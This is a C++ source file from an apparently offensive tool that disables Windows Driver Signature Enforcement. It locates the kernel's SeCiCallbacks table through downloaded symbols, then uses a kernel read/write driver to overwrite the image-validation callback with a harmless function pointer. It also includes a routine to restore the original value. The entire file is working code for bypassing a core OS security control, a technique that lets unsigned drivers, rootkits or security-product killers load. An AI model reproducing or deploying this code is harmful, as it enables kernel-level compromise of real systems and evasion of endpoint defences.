// DSEBypassNG.cpp

#include "DSEBypassNG.h"
#include "SessionManager.h"
#include <psapi.h>

DSEBypassNG::DSEBypassNG(std::unique_ptr<kvc>& driver) 
    : m_driver(driver) 
{
}

std::optional<std::pair<DWORD64, std::wstring>> DSEBypassNG::GetKernelInfo() noexcept {
    LPVOID drivers[1024];
    DWORD needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        ERROR(L"[DSE-NG] Failed to enumerate device drivers");
        return std::nullopt;
    }

    DWORD64 kernelBase = (DWORD64)drivers[0]; // First module is ntoskrnl
    
    // Build path to ntoskrnl.exe in System32
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring fullPath = std::wstring(sysDir) + L"\\ntoskrnl.exe";

    DEBUG(L"[DSE-NG] Kernel base: 0x%llX", kernelBase);
    DEBUG(L"[DSE-NG] Kernel path: %s", fullPath.c_str());

    return std::make_pair(kernelBase, fullPath);
}

bool DSEBypassNG::DisableDSE() noexcept {
    INFO(L"[DSE-NG] Initializing Next-Gen DSE Bypass (Safe Mode)...");

    // Initialize symbol engine
    if (!m_symbolEngine.Initialize()) {
        ERROR(L"[DSE-NG] Failed to initialize symbol engine");
        return false;
    }

    // Get kernel base and path
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"[DSE-NG] Failed to locate ntoskrnl.exe base");
        return false;
    }
    DWORD64 kernelBase = kernelInfo->first;
    std::wstring kernelPath = kernelInfo->second;

    // Download/ensure symbols are available
    INFO(L"[DSE-NG] Resolving symbols for kernel...");
    if (!m_symbolEngine.EnsureSymbolsForModule(kernelPath)) {
        ERROR(L"[DSE-NG] Failed to download/load PDBs. Internet connection required.");
        return false;
    }

    // Resolve symbol offsets
    auto offSeCi = m_symbolEngine.GetSymbolOffset(kernelPath, L"SeCiCallbacks");
    auto offZwFlush = m_symbolEngine.GetSymbolOffset(kernelPath, L"ZwFlushInstructionCache");

    if (!offSeCi || !offZwFlush) {
        ERROR(L"[DSE-NG] Failed to resolve necessary symbols");
        return false;
    }

    // Calculate kernel addresses
    DWORD64 targetAddress = kernelBase + *offSeCi + 0x20; // ValidateImageHeader callback
    DWORD64 safeFunction = kernelBase + *offZwFlush;

    INFO(L"[DSE-NG] Target Address: 0x%llX", targetAddress);
    INFO(L"[DSE-NG] Patch Value (ZwFlush): 0x%llX", safeFunction);

    // Read original callback value
    auto original = m_driver->Read64(targetAddress);
    if (!original) {
        ERROR(L"[DSE-NG] Failed to read current kernel callback");
        return false;
    }

    if (*original == safeFunction) {
        SUCCESS(L"[DSE-NG] DSE is already disabled (Safe Mode)");
        return true;
    }

	// Save original callback + offsets to registry
    SessionManager::SaveOriginalCiCallback(*original);
    SessionManager::SaveDSENGOffsets(*offSeCi, *offZwFlush, kernelBase);
    DEBUG(L"[DSE-NG] Saved original callback: 0x%llX", *original);
    DEBUG(L"[DSE-NG] Saved offsets: SeCi=0x%llX, ZwFlush=0x%llX", *offSeCi, *offZwFlush);

    // Apply patch
    if (m_driver->Write64(targetAddress, safeFunction)) {
        SUCCESS(L"[DSE-NG] DSE disabled successfully via SeCiCallbacks");
        return true;
    } else {
        ERROR(L"[DSE-NG] Failed to write to kernel memory");
        return false;
    }
}

bool DSEBypassNG::RestoreDSE() noexcept {
    INFO(L"[DSE-NG] Restoring DSE configuration...");

    // Try loading from registry first
    auto savedOffsets = SessionManager::GetDSENGOffsets();
    DWORD64 targetAddress = 0;
    
    if (savedOffsets.has_value()) {
        // Use saved offsets - no need to re-download symbols
        auto [offSeCi, offZwFlush, savedKernelBase] = *savedOffsets;
        
        auto kernelInfo = GetKernelInfo();
        if (!kernelInfo) {
            ERROR(L"[DSE-NG] Failed to locate kernel base");
            return false;
        }
        
        DWORD64 currentKernelBase = kernelInfo->first;
        targetAddress = currentKernelBase + offSeCi + 0x20;
        
        DEBUG(L"[DSE-NG] Using cached offsets: SeCi=0x%llX, target=0x%llX", offSeCi, targetAddress);
    } else {
        // Fallback: re-resolve symbols
        INFO(L"[DSE-NG] No cached offsets found, re-resolving symbols...");
        
        if (!m_symbolEngine.Initialize()) {
            ERROR(L"[DSE-NG] Failed to initialize symbol engine");
            return false;
        }

        auto kernelInfo = GetKernelInfo();
        if (!kernelInfo) {
            ERROR(L"[DSE-NG] Failed to locate kernel base");
            return false;
        }
        
        if (!m_symbolEngine.EnsureSymbolsForModule(kernelInfo->second)) {
            ERROR(L"[DSE-NG] Failed to load symbols for restoration");
            return false;
        }
        
        auto offSeCi = m_symbolEngine.GetSymbolOffset(kernelInfo->second, L"SeCiCallbacks");
        if (!offSeCi) {
            ERROR(L"[DSE-NG] Failed to resolve SeCiCallbacks offset");
            return false;
        }

        targetAddress = kernelInfo->first + *offSeCi + 0x20;
    }

    // Load original callback from registry
    auto original = SessionManager::GetOriginalCiCallback();
    if (original == 0) {
        ERROR(L"[DSE-NG] No original callback saved in registry. Cannot restore safely.");
        return false;
    }

    DEBUG(L"[DSE-NG] Restoring callback to: 0x%llX at address 0x%llX", original, targetAddress);

    // Restore original callback
    if (m_driver->Write64(targetAddress, original)) {
        SUCCESS(L"[DSE-NG] DSE restored successfully");
        SessionManager::ClearOriginalCiCallback();
        SessionManager::ClearDSENGOffsets();
        return true;
    }

    ERROR(L"[DSE-NG] Failed to restore kernel callback");
    return false;
}